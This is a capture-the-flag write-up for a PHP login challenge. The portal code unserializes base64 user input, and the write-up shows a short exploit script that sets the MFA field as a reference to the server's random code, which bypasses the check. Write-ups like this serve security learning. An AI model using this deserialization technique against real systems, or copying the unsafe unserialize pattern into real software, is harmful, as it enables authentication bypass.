---
description: PHP object injection (deserialization vulnerability)
---

# Corporate MFA

## Problem

The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code.

{% file src="../../.gitbook/assets/corpmfa.tar.gz" %}

## Source Code

`index.php`:

```php
<?php

include 'class/User.php';

if (!empty($_POST))
{
	// serialise POST data for easy logging
	$loginAttempt = serialize((object)$_POST);

	// log access
	//Logger::log(Logger::SENSITIVE, 'Login attempt: ' . $loginAttempt);

	// Hand over to federation login
	// TODO currently just a mock up
	// TODO encrypt information to avoid loos of confidentiality
	header('Location: /?userdata=' . base64_encode($loginAttempt));
	die();
}

if (!empty($_GET) && isset($_GET['userdata']))
{
	// prepare notification data structure
	$notification = new stdClass();

	// check credentials & MFA
	try
	{
		$user = new User(base64_decode($_GET['userdata']));
		if ($user->verify())
		{
			$notification->type = 'success';
			$notification->text = 'Congratulations, your flag is: ' . file_get_contents('/flag.txt');
		}
		else
		{
			throw new InvalidArgumentException('Invalid credentials or MFA token value');
		}
	}
	catch (Exception $e)
	{
		$notification->type = 'danger';
		$notification->text = $e->getMessage();
	}
}

include 'template/home.html';
```

`User.php`:

```php
<?php

final class User
{
	private $userData;

	public function __construct($loginAttempt)
	{
		$this->userData = unserialize($loginAttempt);
		if (!$this->userData)
			throw new InvalidArgumentException('Unable to reconstruct user data');
	}

	private function verifyUsername()
	{
		return $this->userData->username === 'D0loresH4ze';
	}

	private function verifyPassword()
	{
		return password_verify($this->userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq');
	}

	private function verifyMFA()
	{
		$this->userData->_correctValue = random_int(1e10, 1e11 - 1);
		return (int)$this->userData->mfa === $this->userData->_correctValue;
	}
	
	public function verify()
	{
		if (!$this->verifyUsername())
			throw new InvalidArgumentException('Invalid username');

		if (!$this->verifyPassword())
			throw new InvalidArgumentException('Invalid password');

		if (!$this->verifyMFA())
			throw new InvalidArgumentException('Invalid MFA token value');

		return true;
	}

}
```

## Solution

From analysing the source code, we can gather the following information:

* Username: Hardcoded
* Password: From the first example here: [https://www.php.net/manual/en/function.password-verify.php](https://www.php.net/manual/en/function.password-verify.php)
* MFA: Vulnerable to PHP object injection (`unserialize()` vulnerability)

The trick here is to initialize the `mfa` attribute as a **reference** to the `_correctValue` attribute (using the ampersand operator &). This will allow us to bypass the MFA check, which checks `mfa` against a randomly-generated `_correctValue`:

```php
private function verifyMFA()
	{
		$this->userData->_correctValue = random_int(1e10, 1e11 - 1);
		return (int)$this->userData->mfa === $this->userData->_correctValue;
	}
```

The exploit script:

```php
<?php
    include "class/User.php";

    $loginAttempt=new stdClass();
    $loginAttempt->username = 'D0loresH4ze';
    $loginAttempt->password = 'rasmuslerdorf';
    $loginAttempt->_correctValue = NULL;
    $loginAttempt->mfa = &$loginAttempt->_correctValue;

    $userData = serialize($loginAttempt);
    $encoded = base64_encode($userData);
    var_dump($encoded);

    $user = new User(base64_decode($encoded));
    var_dump($user);
    $user->verify();
?>
```
